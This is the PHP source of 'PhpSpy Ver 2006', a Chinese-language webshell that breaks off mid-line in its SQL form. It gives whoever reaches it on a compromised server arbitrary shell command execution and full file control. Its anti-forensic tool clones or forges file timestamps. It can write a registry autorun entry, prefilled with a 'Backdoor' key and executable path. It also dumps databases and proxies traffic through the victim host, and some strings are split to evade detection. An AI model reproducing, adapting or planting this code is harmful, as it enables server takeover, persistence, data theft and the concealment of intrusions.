<?php
/*
+--------------------------------------------------------------------------+
| str_replace(".", "", "P.h.p.S.p.y") Version:2006                         |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Mar 21st 2005                                                     |
| Thx All The Fantasy of Wickedness's members                              |
| Thx FireFox (http://www.molyx.com)                                       |
+--------------------------------------------------------------------------+
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== 程序配置 =====================*/

// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check'] = "1";

// 如果需要密码验证,请修改登陆密码
$admin['pass']  = "wx";

/*===================== 配置结束 =====================*/


// 允许程序在 register_globals = off 的环境下工作
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== 身份验证 =====================*/
if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 gt;gt;gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 gt;gt;gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== 验证结束 =====================*/

// 判断 magic_quotes_gpc 状态
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// 查看PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看lt;PHP环境变量gt;";
	exit;
}

// 在线代理
if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
	exit;
}

// 下载文件
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('你要下的文件不存在!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// 直接下载备份数据库
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "出错: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// 程序目录
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// 获取当前路径
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// 判断读写情况
$dir_writeable = (dir_writeable($nowpath)) ? "可写" : "不可写";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">注册表操作</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2006</title>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#A60000";
}
a:link,a:visited,a:active {
	color: "#000000";
	text-decoration: underline;
}
a:hover {
	color: "#465584";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?action=logout">注销会话</a> | <a href="?action=dir">返回PhpSpy目录</a> | <a href="?action=phpenv">PHP环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a>');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'上传文件到当前目录: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','确定','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'新建文件在当前目录: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','确定','','submit')));

$tb->headerform(array('content'=>'新建目录在当前目录: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','确定','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== 执行操作 开始 =====================*/
echo "<p><b>\n";
// 删除文件
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." 删除成功!" : "文件删除失败!";
	} else {
		echo basename($delfile)." 文件已不存在!";
	}
}

// 删除目录
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir 目录已不存在!";
	} else {
		echo (deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!";
	}
}

// 创建目录
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "该目录已存在!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!";
			@chmod("$mkdirs",0777);
		}
	}
}

// 上传文件
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "上传成功!" : "上传失败!";
}

// 编辑文件
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "写入文件成功!" : "写入失败!";
		@fclose($fp);
	} else {
		echo "请输入想要编辑的文件名!";
	}
}

// 编辑文件属性
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "属性修改成功!" : "修改失败!";
		echo " 文件 ".$file." 修改后的属性为: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "请输入想要设置的属性!";
	}
}

// 文件改名
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." 已经存在,请重新输入一个!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." 成功改名为 ".$_POST['newname']." !" : "文件名修改失败!";
		}
	} else {
		echo "请输入想要改的文件名!";
	}
}

// 克隆时间
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "要修改的文件不存在!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "要参照的文件不存在!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
		}
	}
}

// 自定义时间
elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "要修改的文件不存在!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." 的修改时间成功改为 ".date("Y-m-d H:i:s",$time)." !" : "文件的修改时间修改失败!";
		}
	}
}

// 连接MYSQL
elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "数据库连接成功!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// 执行SQL语句
elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL语句成功执行!" : "出错: ".mysql_error();
	mysql_close();
}

// 备份操作
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "请选择欲备份的数据表和备份方式!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
			@mysql_select_db($dbname) or die("选择数据库失败");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : "出错: ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "数据库已成功备份到 <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "备份失败,请确认目标文件夹是否具有可写权限!";
			}
		}
	}
}

// 打包下载 PS:文件太大可能非常慢
// Thx : 小花
elseif($downrar) {
	if (!empty($dl)) {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);
		$zip=new PHPZip($dl);
		$code=$zip->out;		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
		echo $code;
		exit;
	} else {
		echo "请选择要打包下载的文件!";
	}
}

// Shell.Application 运行程序
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "程序已经成功执行!" : "程序运行失败!";
}

// 查看PHP配置参数状况
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
}

// 读取注册表
elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}

// 写入注册表
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "写入注册表健值成功!" : "写入 ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." 失败!";
}

// 删除注册表
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "删除注册表健值成功!" : "删除 ".$_POST['delregname']." 失败!";
}

else {
	echo "本程序由 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> 小组 angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] 独立开发,可在 <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> 下载最新版本.";
}

echo "</b></p>\n";
/*===================== 执行操作 结束 =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>文件</b></td>
	<td align="center" nowrap width="16%"><b>创建日期</b></td>
    <td align="center" nowrap width="16%"><b>最后修改</b></td>
    <td align="center" nowrap width="11%"><b>大小</b></td>
    <td align="center" nowrap width="6%"><b>属性</b></td>
    <td align="center" nowrap width="24%"><b>操作</b></td>
  </tr>
<?php
// 目录列表
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap><a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\">删除</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// 文件列表
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','你确定要删除 $file 文件吗?','2')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">改名</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">时间</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','选中文件打包下载','','submit').'</td><td align="right">'.$dir_i.' 个目录 / '.$file_i.' 个文件</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'新建/编辑文件');
	$tb->tdbody('当前文件: '.$tb->makeinput('editfilename',$filename).' 输入新文件名则建立新文件');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'修改文件名');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('当前文件名: '.basename($nowfile));
	$tb->tdbody('改名为: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'修改文件属性');
	$tb->tdbody('修改 '.$file.' 的属性为: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'克隆文件最后修改时间');
	$tb->tdbody("修改文件: ".$tb->makeinput('curfile',$file,'readonly')." → 目标文件: ".$tb->makeinput('tarfile','需填完整路径及文件名'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'自定义文件最后修改时间');
	$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');
	$tb->tdbody('当前文件名: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('修改为: '.$tb->makeinput('year','1984','','text','4').' 年 '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' 月 '.$tb->makeinput('data','18','','text','2').' 日 '.$tb->makeinput('hour','20','','text','2').' 时 '.$tb->makeinput('minute','00','','text','2').' 分 '.$tb->makeinput('second','00','','text','2').' 秒','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');

	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('无回显运行程序 → 文件: '.$tb->makeinput('program',$program).' 参数: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}

	echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
	$tb->tdbody('提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容.');
	
	$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');

	$tb->tdbody('选择执行函数: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' 输入命令: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'读取注册表');
	$tb->tdbody('键值: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','读取','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'写入注册表');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('键值: '.$tb->makeinput('writeregname',$registre,'','text','56').' 类型: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' 值:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','写入','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'删除注册表');
	$tb->tdbody('键值: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','删除','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg

elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'在线代理','proxyframe');
	$tb->tdbody('<br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.4ngel.net"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
	$tb->tableheader();
	$tb->formheader($action,'执行 SQL 语句');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_que